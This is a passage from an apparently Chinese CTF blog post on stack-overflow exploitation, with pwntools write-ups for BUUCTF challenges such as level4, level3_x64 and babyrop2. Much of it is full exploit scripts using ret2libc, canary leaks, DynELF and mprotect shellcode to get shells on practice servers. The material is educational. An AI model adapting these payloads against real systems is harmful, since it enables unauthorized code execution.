class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">proc_name = <span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span></span><br><span class="line">elf = ELF(proc_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这道题本地和远程两种解法，真的干。。。</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    sh = process(proc_name)</span><br><span class="line">str_flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">    backdoor_addr = <span class="number">0x080489A0</span></span><br><span class="line">    printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="number">0x2D</span> * <span class="string">&#x27;a&#x27;</span> <span class="comment"># 这边不用覆盖ebp,在于get_flag并没有push ebp</span></span><br><span class="line">    payload += p32(backdoor_addr) + p32(printf_addr)</span><br><span class="line">    payload += p32(str_flag_addr)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28308</span>)</span><br><span class="line">    mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">    read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    pop3_edi_esi_ebx_ret = <span class="number">0x0806fcc8</span></span><br><span class="line">    mem_addr = <span class="number">0x080EB000</span> <span class="comment">#.got.plt 的起始地址</span></span><br><span class="line">    mem_size = <span class="number">0x1000</span></span><br><span class="line">    mem_type = <span class="number">0x7</span> <span class="comment"># 可执行权限</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="number">0x2D</span> * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">    payload += p32(mprotect_addr)</span><br><span class="line">    payload += p32(pop3_edi_esi_ebx_ret)</span><br><span class="line">    payload += p32(mem_addr) + p32(mem_size) + p32(mem_type)</span><br><span class="line">    payload += p32(read_addr)</span><br><span class="line">    payload += p32(pop3_edi_esi_ebx_ret)</span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(mem_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line">    payload += p32(mem_addr)    <span class="comment">#将read函数的返回地址设置到我们修改的内存的地址，之后我们要往里面写入shellcode</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    <span class="comment"># read写入shellcode</span></span><br><span class="line">    payload = asm(shellcraft.sh())</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="五-32位，64位栈溢出对比"><a href="#五-32位，64位栈溢出对比" class="headerlink" title="五. 32位，64位栈溢出对比"></a>五. 32位，64位栈溢出对比</h2><p>32位的函数在调用栈的时候是：</p><pre><code>   调用函数地址(父函数的栈底地址）-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1....-&gt;参数1</code></pre><p>由于在函数调用前通过push指令向栈中压入了数据，使得栈顶朝低地址偏移了所以在函数调用结束以后，要有恢复栈顶的过程：将通过add esp 0x10这条指令，即增加esp来恢复函数调用前的esp。</p><p><img src="https://i.loli.net/2021/10/14/YauJBxpfHbqmUeX.png" alt="image-20211014161530117"></p><p><img src="https://i.loli.net/2021/10/14/YakGtgM3oKCUZc8.png" alt="image-20211014161545492"></p><p>64位的函数在调用栈的时候是：</p><pre><code>   前六个参数按照约定存储在寄存器：rdi,rsi,rdx,rcx,r8,r9中。   参数超过六个的时候，第七个会压入栈中，并且先输入函数的返回地址，然后是函数的参数，之后才是函数的调用地址</code></pre><p><img src="https://i.loli.net/2021/10/14/YviIJ6DHCqbA8um.png" alt="image-20211014161246387"></p><h2 id="六-覆盖相关变量"><a href="#六-覆盖相关变量" class="headerlink" title="六. 覆盖相关变量"></a>六. 覆盖相关变量</h2><ol><li><p>ebp</p></li><li><p>ret_addr</p></li><li><p>虚函数指针</p><p>​    子类对父类的继承<br>​    能够对函数进行重写<br>​    由虚函数表来进行操作</p></li><li><p>SEH链</p><p>​    SEH结构 结构 在栈中存在的 地方 ，在 在ret_addr和栈中数据之间 和栈中数据之间，这就导致了对于栈的安全防护 手段 ， 难以防护针对 防护针对SEH链的攻击</p></li><li><p>Hook中的变量</p><p>利用方法介绍<br> 有些系统函数有预先定义好的钩子<br> 修改钩子链表中存储的子程序指针<br>影响钩子运行</p></li><li><p>fgets的用法的时候，发现它能够避免造成溢出</p></li><li><p>程序自带的system函数地址</p></li><li><p>timeout: the monitored command dumped core解决</p><p>1)在payload后面加几个ret地址，或者加一个假的0xdeadbeef</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>, pop_di, bin_sh_addr, system, <span class="number">0xdeadbeef</span>])</span><br></pre></td></tr></table></figure><p>2)直接用系统函数的地址</p><h2 id="七-BUUCTF-例题"><a href="#七-BUUCTF-例题" class="headerlink" title="七. BUUCTF 例题"></a>七. BUUCTF 例题</h2><h3 id="1-JarvisOJ-level4"><a href="#1-JarvisOJ-level4" class="headerlink" title="1. JarvisOJ level4"></a>1. JarvisOJ level4</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>参考文章：<a href="https://www.anquanke.com/post/id/85129">借助DynELF实现无libc的漏洞利用小结</a></p><p>pwntools中DynELF函数使用(针对未给出libc文件)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload=pad+p32(writeplt)+ret1+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    leak_sysaddr=io.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#print &quot;%#x =&gt; %s&quot; % (address, (leak_sysaddr or &#x27;&#x27;).encode(&#x27;hex&#x27;))   这里是测试用，可省略。</span></span><br><span class="line">    <span class="keyword">return</span> leak_sysaddr</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&quot;对应文件&quot;</span>))</span><br><span class="line">sysaddr=d.lookup(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;libc&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pad为填充，ret1为有效的返回地址</p><h4 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h4><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161018270.png" alt="image-20211116101807208"></p><p>开了NX保护（堆栈不可执行）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161046138.png" alt="image-20211116104613084"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111161046265.png" alt="image-20211116104635203"></p><p>利用DynELF泄露system地址，通过read函数写入/bin/sh到bss段</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">conn=process(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">pad=<span class="number">0x88</span></span><br><span class="line">write_plt=e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vul_addr=<span class="number">0x804844b</span></span><br><span class="line">bss_addr=<span class="number">0x0804a024</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(write_plt)+p32(vul_addr)+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line">    conn.sendline(payload1)</span><br><span class="line">    data=conn.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> data </span><br><span class="line">d=DynELF(leak,elf=e)</span><br><span class="line">system_addr=d.lookup(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_addr)</span><br><span class="line">read_plt=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span>+p32(read_plt)+p32(vul_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)</span><br><span class="line">conn.sendline(payload2)</span><br><span class="line">conn.send(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">payload3=<span class="string">&quot;a&quot;</span>*<span class="number">0x8c</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bss_addr)</span><br><span class="line">conn.sendline(payload3)</span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>常规解法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25934</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level4&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x8c</span> + p32(write_plt)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x8c</span> + p32(system_addr)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h4><p>64位ret2libc（no canary found)</p><p>checksec </p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170933327.png" alt="image-20211117093331127"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170933230.png" alt="image-20211117093259888"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170934032.png" alt="image-20211117093412861"></p><ol><li><p>泄露libc</p><p>64位汇编传参，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。<br>我们这边要利用write函数去泄露libc版本<br>write函数的原型，它有三个参数，所以我们这边需要用到三个寄存器去传参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t write(<span class="built_in">int</span> fd,const void*buf,size_t count);</span><br><span class="line">参数说明：</span><br><span class="line">  fd:是文件描述符（write所对应的是写，即就是<span class="number">1</span>）</span><br><span class="line">  buf:通常是一个字符串，需要写入的字符串</span><br><span class="line">  count：是每次写入的字节数</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>利用ROPgadget寻找rdi,rsi寄存器地址</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170944869.png" alt="image-20211117094445688"></p><p>WP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26919</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./level3_x64&#x27;)</span></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.19.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0x40061A</span></span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x4006b3</span></span><br><span class="line">rsi_r15=<span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi)+p64(<span class="number">1</span>)  <span class="comment">#rdi寄存器设置write函数的第一个参数为‘1’</span></span><br><span class="line">payload+=p64(rsi_r15)+p64(write_got)+p64(<span class="number">8</span>) <span class="comment">#rsi寄存器设置write函数的第二个参数为write_got表的地址，r15寄存器设置write函数的第三个参数为8</span></span><br><span class="line">payload+=p64(write_plt) <span class="comment">#去调用write函数</span></span><br><span class="line">payload+=p64(main)   <span class="comment">#控制程序流，回到main函数，继续控制</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">write_addr=u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#write_addr=u64(r.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi)+p64(binsh)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h4><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171032428.png" alt="image-20211117103202380"></p><p>程序结构</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171033966.png" alt="image-20211117103343882"></p><p>init（）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171034471.png" alt="image-20211117103404402"></p><p>gift（）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171034134.png" alt="image-20211117103423993"></p><p>vuln（）</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171035485.png" alt="image-20211117103501439"></p><p>在gift函数处存在格式化字符串漏洞，可以用来泄露libc</p><p>在vuln函数处存在buf溢出漏洞，绕过canary就可以利用ret2libc来获取shell</p><ol><li><p>泄露canary值</p><p>输入<code>%n$p</code>来找偏移，n为偏移量，<code>$p</code>定位到偏移处，<code>%p</code>以16进制输出</p></li></ol><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171044092.png" alt="image-20211117104417028"></p><ol start="2"><li><p>找到一个nop指令下断点查看栈的情况</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171057700.png" alt="image-20211117105719634"></p></li><li><p>可以看到6161下面有一串16进制数，这个就是canary值，利用%7$p就可以泄露它的值，而且看到它在栈的位置是0x18</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171057722.png" alt="image-20211117105745656"></p><p>泄露canary:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>另外pwngbd提供了一种方便的函数fmtarg，使用格式为fmtarg addr。在进入printf函数时断下，调用fmtarg后可以自动计算格式化参数与addr的偏移。fmtarg在计算index时将RDI也算了进去，后面会自动减一作为%$p的参数：</p><p><img src="https://img-blog.csdnimg.cn/20200826223512973.png#pic_center" alt="在这里插入图片描述"></p><ol start="4"><li>利用puts函数泄露libc，puts函数只有一个参数，64位传参，利用rdi寄存器即可，ROPgadget找rdi</li></ol><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171101909.png" alt="image-20211117110117854"></p></li></ol><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./bjdctf_2020_babyrop2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25998</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span>(canary)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400993</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vul_addr = <span class="number">0x400887</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload +=p64(pop_rdi)</span><br><span class="line">payload +=p64(puts_got)</span><br><span class="line">payload +=p64(puts_plt)+p64(vul_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;story!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(binsh)+p64(sys_addr)</span><br><span class="line"></span><br><span class="line">payload +=p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><p>printf泄露真实地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#p=process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25002</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">format_addr=<span class="number">0x400770</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x000000000040072c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400730 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400732 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004005a0 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400733 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400731 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004004d1 : ret</span></span><br><span class="line"><span class="string">0x0000000000400532 : ret 0x200a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>+p64(<span class="number">0x400733</span>)+p64(format_addr)+p64(<span class="number">0x400731</span>)+p64(read_got)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(printf_plt)+p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;name?&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">read_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;read&quot;</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr=libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload2=<span 